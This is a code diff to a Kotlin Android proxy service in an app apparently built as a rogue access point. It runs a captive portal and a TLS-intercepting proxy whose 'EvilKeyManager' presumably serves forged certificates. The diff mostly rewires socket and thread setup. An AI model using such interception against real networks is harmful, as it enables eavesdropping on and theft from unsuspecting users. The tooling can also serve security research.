@@ -22,8 +22,8 @@ class ProxyService : Service(){
     protected val TAG = javaClass.simpleName
     private lateinit var  mSocketProxy: ServerSocket
     private lateinit var  mSocketPortal: ServerSocket
-    private lateinit var  mProxyHTTPS: ThreadNioProxyHTTPS
-    private lateinit var  mProxyHTTP: ThreadNioProxyHTTP
+    private lateinit var  mNioHTTPS: ThreadNioHTTPS
+    private lateinit var  mProxyHTTP: ThreadNioHTTP
     // This service is only bound from inside the same process and never uses IPC.
     internal inner class LocalBinder : Binder() {
         val service = this@ProxyService
@@ -40,20 +40,22 @@ class ProxyService : Service(){
         // the services normally runs in the process's main thread, which we don't want to block.
         try {
             mSocketProxy = ServerSocket()
-            //mSocketProxy = getEvilSSLSocket()
+            //mSocketProxy = getEvilSSLSocket(EvilApApp.instance.ekm)
             mSocketPortal = ServerSocket()
         } catch (e: Exception) {
             e.printStackTrace()
         }
         //start the proxy socket thread
-        val proxy = Thread(MainLoopProxy(mSocketProxy, EvilApApp.instance.PORT_PROXY_HTTP))
-        //proxy.start()
+        val proxy = Thread(MainLoopProxy(mSocketProxy, EvilApApp.instance.PORT_PROXY_HTTPS,
+                EvilApApp.instance.sslCtx, EvilApApp.instance.ekm))
+        proxy.start()
 
-        mProxyHTTP = ThreadNioProxyHTTP("0.0.0.0", EvilApApp.instance.PORT_PROXY_HTTP)
-        Thread(mProxyHTTP).start()
+        mProxyHTTP = ThreadNioHTTP("0.0.0.0", EvilApApp.instance.PORT_PROXY_HTTP)
+        //Thread(mProxyHTTP).start()
 
-        mProxyHTTPS = ThreadNioProxyHTTPS("0.0.0.0", EvilApApp.instance.PORT_PROXY_HTTPS, EvilApApp.instance.ekm)
-        //Thread(mProxyHTTPS).start()
+        mNioHTTPS = ThreadNioHTTPS("0.0.0.0", EvilApApp.instance.PORT_PROXY_HTTPS,
+                EvilApApp.instance.ekm, EvilApApp.instance.exec)
+        //Thread(mNioHTTPS).start()
 
         //start the captive portal thread
         Thread(MainLoopCaptivePortal(mSocketPortal)).start()
@@ -81,7 +83,7 @@ class ProxyService : Service(){
             Log.e(TAG,"Closing server sockets!")
             mSocketProxy.close()
             mProxyHTTP.exit()
-            mProxyHTTPS.stop()
+            mNioHTTPS.stop()
             mSocketPortal.close()
 
         } catch (e: IOException) {
@@ -90,17 +92,17 @@ class ProxyService : Service(){
         stopSelf()
     }
 
-    private fun getEvilSSLSocket(): ServerSocket {
+    private fun getEvilSSLSocket(ekm: EvilKeyManager): ServerSocket {
         val sc = SSLContext.getInstance("TLS")
         // key manager[], trust manager[], SecureRandom generator
-        sc.init(arrayOf(EvilKeyManager(EvilApApp.instance.ca)), null, null)
-        //sc.init(null, null, null)
+        sc.init(arrayOf(ekm), null, null)
         val ssf = sc.serverSocketFactory
         val sock = ssf.createServerSocket() as SSLServerSocket
         sock.useClientMode = false
         // Use only TLSv1.2 to get access to ExtendedSSLSession
         // https://docs.oracle.com/javase/8/docs/technotes/guides/security/jsse/JSSERefGuide.html#SSLSession
         //val params = sock.sslParameters
+        //params.serverNames = listOf(SNIHostName("somename.com"))
         //params.protocols = arrayOf("TLSv1.2")
         //params.sniMatchers = listOf(EvilSniMatcher())
         //sock.sslParameters = params
